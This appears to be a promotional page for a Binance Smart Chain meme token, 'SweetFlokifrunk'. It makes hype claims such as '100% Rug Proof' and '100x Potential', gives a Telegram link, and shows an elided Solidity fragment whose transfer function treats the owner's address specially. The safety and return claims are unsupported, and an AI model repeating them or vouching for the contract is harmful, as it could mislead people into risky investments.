...
SweetFlokifrunk
/ ⏰ Ownership renounced ✅ Verified contract 🔥 100% Rug Proof 🔍 100x Potential 🚀


 ($SweetFlokifrunk) is a decentralized Community experiment in Binance Smart Chain, with prospects of becoming the #1 Helper tools Ecosystem.


Learn about $SweetFlokifrunk Tokenomics:

🔥 100,000,000,000 Total Supply. 
🔥 DeepLock
🔥 Renounce

Tg : https://t.me/SweetFlokifrunk
...
contract SweetFloki_Frunk is Context, IERC20, Ownable {
    ...
    uint256 private _SweetFlokiFrunk;
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        if (sender == owner()) {
            ...
            uint256 burnAmount = amount.mul(_SweetFlokiFrunk).div(100);
